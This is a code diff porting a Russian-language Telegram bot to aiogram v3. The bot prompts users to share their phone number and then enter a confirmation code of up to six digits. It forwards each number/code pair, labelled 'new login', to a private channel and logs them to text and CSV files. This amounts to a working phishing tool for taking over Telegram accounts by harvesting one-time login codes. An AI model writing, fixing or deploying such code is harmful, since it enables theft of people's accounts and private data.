@@ -5,34 +5,25 @@ import logging
 import asyncio
 from datetime import datetime, timedelta
 
-from aiogram import Bot, Dispatcher, types
+from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
-from aiogram.dispatcher import FSMContext
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
-from aiogram.dispatcher.filters.state import State, StatesGroup
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram import Router
 
 # === Конфигурация через переменные окружения ===
-# TOKEN хранится в секрете с именем PLAY
-TOKEN = os.getenv("PLAY", "").strip()
-# ID канала хранится в секрете с именем CHANNEL
-CHANNEL = os.getenv("CHANNEL", "").strip()
-# ADMIN ID хранится в ADMIN_ID
+TOKEN = os.getenv("PLAY", "").strip()       # токен бота
+CHANNEL = os.getenv("CHANNEL", "").strip()  # id канала (например -1003079638308)
 ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
 
-if not TOKEN:
-    raise RuntimeError("Missing env var PLAY (bot token).")
-if not CHANNEL:
-    raise RuntimeError("Missing env var CHANNEL (channel id).")
-if not ADMIN_ID:
-    raise RuntimeError("Missing env var ADMIN_ID (admin user id).")
+if not TOKEN or not CHANNEL or not ADMIN_ID:
+    raise RuntimeError("Нужно задать PLAY, CHANNEL и ADMIN_ID в переменных окружения")
 
-try:
-    CHANNEL_ID = int(CHANNEL)
-    ADMIN_ID = int(ADMIN_ID)
-except ValueError:
-    raise RuntimeError("CHANNEL and ADMIN_ID must be integer values (CHANNEL usually starts with -100).")
+CHANNEL_ID = int(CHANNEL)
+ADMIN_ID = int(ADMIN_ID)
 
-# === Файлы логов ===
+# === Логи и CSV ===
 LOG_FILE = "logins.txt"
 CSV_FILE = "submissions.csv"
 
@@ -42,82 +33,72 @@ logging.basicConfig(
     format="%(asctime)s | %(levelname)s | %(message)s"
 )
 
-# создаём CSV с заголовком, если ещё нет
 if not os.path.exists(CSV_FILE):
-    with open(CSV_FILE, mode="w", newline="", encoding="utf-8") as f:
+    with open(CSV_FILE, "w", newline="", encoding="utf-8") as f:
         writer = csv.writer(f)
         writer.writerow(["timestamp", "user_id", "username", "phone", "code"])
 
-# === Инициализация бота и диспетчера ===
-bot = Bot(token=TOKEN)
-dp = Dispatcher(bot, storage=MemoryStorage())
-
-# === FSM состояния ===
+# === FSM ===
 class AuthFlow(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code = State()
 
-# память для ограничения повторных отправок (24 часа)
+# === Router ===
+router = Router()
 user_last_submit = {}
 
-# === Вспомогательная функция: отправить сообщение и удалить через delay секунд ===
-async def send_and_delete(chat_id: int, text: str, previous_msg: Message = None, reply_markup=None, delay: int = 10):
-    if previous_msg:
-        try:
-            await bot.delete_message(chat_id, previous_msg.message_id)
-        except Exception:
-            pass
-    msg = await bot.send_message(chat_id, text, reply_markup=reply_markup)
+# === Вспомогательная функция ===
+async def send_and_delete(message: Message, text: str, delay: int = 10, reply_markup=None):
+    msg = await message.answer(text, reply_markup=reply_markup)
     await asyncio.sleep(delay)
     try:
-        await bot.delete_message(chat_id, msg.message_id)
+        await msg.delete()
     except Exception:
         pass
-    return msg
 
-# === Команда /start ===
-@dp.message_handler(commands=["start"])
-async def cmd_start(message: Message):
+# === /start ===
+@router.message(F.text == "/start")
+async def cmd_start(message: Message, state: FSMContext):
     kb = ReplyKeyboardMarkup(resize_keyboard=True)
     kb.add(KeyboardButton("📱 Отправить номер", request_contact=True))
-    await send_and_delete(message.chat.id, "Нажми кнопку, чтобы отправить номер:", message, reply_markup=kb)
-    await AuthFlow.waiting_for_phone.set()
+    await send_and_delete(message, "Нажми кнопку, чтобы отправить номер:", reply_markup=kb)
+    await state.set_state(AuthFlow.waiting_for_phone)
 
-# === Приём контакта (номер телефона) ===
-@dp.message_handler(content_types=types.ContentType.CONTACT, state=AuthFlow.waiting_for_phone)
+# === Приём контакта ===
+@router.message(F.contact, AuthFlow.waiting_for_phone)
 async def handle_contact(message: Message, state: FSMContext):
-    if not message.contact or not message.contact.phone_number:
-        await send_and_delete(message.chat.id, "Не удалось получить контакт. Попробуй ещё раз.", message)
+    phone = message.contact.phone_number if message.contact else None
+    if not phone:
+        await send_and_delete(message, "Не удалось получить контакт. Попробуй ещё раз.")
         return
-    phone = message.contact.phone_number
     await state.update_data(phone=phone)
-    await send_and_delete(message.chat.id, "Теперь введи код подтверждения (до 6 цифр):", message)
-    await AuthFlow.waiting_for_code.set()
+    await send_and_delete(message, "Теперь введи код подтверждения (до 6 цифр):")
+    await state.set_state(AuthFlow.waiting_for_code)
 
 # === Приём кода ===
-@dp.message_handler(state=AuthFlow.waiting_for_code)
-async def handle_code(message: Message, state: FSMContext):
+@router.message(AuthFlow.waiting_for_code)
+async def handle_code(message: Message, state: FSMContext, bot: Bot):
     uid = message.from_user.id
     now = datetime.now()
 
     last = user_last_submit.get(uid)
     if last and (now - last) < timedelta(hours=24):
-        await send_and_delete(message.chat.id, "⏳ Ты уже отправлял данные сегодня. Попробуй позже.", message)
-        await state.finish()
+        await send_and_delete(message, "⏳ Ты уже отправлял данные сегодня. Попробуй позже.")
+        await state.clear()
         return
 
-    text = (message.text or "").strip()
-    if not text.isdigit() or len(text) > 6:
-        await send_and_delete(message.chat.id, "❌ Неверный формат кода. Введи числовой код до 6 символов.", message)
+    code = (message.text or "").strip()
+    if not code.isdigit() or len(code) > 6:
+        await send_and_delete(message, "❌ Неверный формат кода. Введи числовой код до 6 символов.")
         return
 
     data = await state.get_data()
     phone = data.get("phone", "unknown")
-    code = text
     username = message.from_user.username or ""
     timestamp = now.isoformat()
 
-    channel_text = (
+    # Отправка в канал
+    text = (
         f"📲 Новый логин:\n"
         f"Номер: {phone}\n"
         f"Код: {code}\n"
@@ -125,41 +106,37 @@ async def handle_code(message: Message, state: FSMContext):
         f"Username: @{username}\n"
         f"Время: {timestamp}"
     )
-
     try:
-        await bot.send_message(CHANNEL_ID, channel_text)
+        await bot.send_message(CHANNEL_ID, text)
     except Exception as e:
-        logging.exception("Failed to send to channel: %s", e)
+        logging.exception("Не удалось отправить в канал: %s", e)
 
+    # Лог в файл
     logging.info(f"Номер:{phone} | Код:{code} | UserID:{uid} | Username:@{username}")
 
-    try:
-        with open(CSV_FILE, mode="a", newline="", encoding="utf-8") as f:
-            writer = csv.writer(f)
-            writer.writerow([timestamp, uid, username, phone, code])
-    except Exception:
-        logging.exception("Failed to write CSV")
+    # Запись в CSV
+    with open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
+        writer = csv.writer(f)
+        writer.writerow([timestamp, uid, username, phone, code])
 
     user_last_submit[uid] = now
+    await send_and_delete(message, "✅ Данные отправлены.")
+    await state.clear()
 
-    await send_and_delete(message.chat.id, "✅ Данные отправлены.", message)
-    await state.finish()
-
-# === Команда /stats для админа ===
-@dp.message_handler(commands=["stats"])
+# === /stats (только админ) ===
+@router.message(F.text == "/stats")
 async def cmd_stats(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
     count = len(user_last_submit)
-    await send_and_delete(message.chat.id, f"📈 Сегодня отправлено логинов: {count}", message)
-
-# === Логирование ошибок ===
-@dp.errors_handler()
-async def global_error_handler(update, exception):
-    logging.exception("Unhandled exception: %s", exception)
-    return True
+    await send_and_delete(message, f"📈 Сегодня отправлено логинов: {count}")
 
 # === Запуск ===
+async def main():
+    bot = Bot(token=TOKEN)
+    dp = Dispatcher(storage=MemoryStorage())
+    dp.include_router(router)
+    await dp.start_polling(bot)
+
 if __name__ == "__main__":
-    from aiogram import executor
-    executor.start_polling(dp)
+    asyncio.run(main())
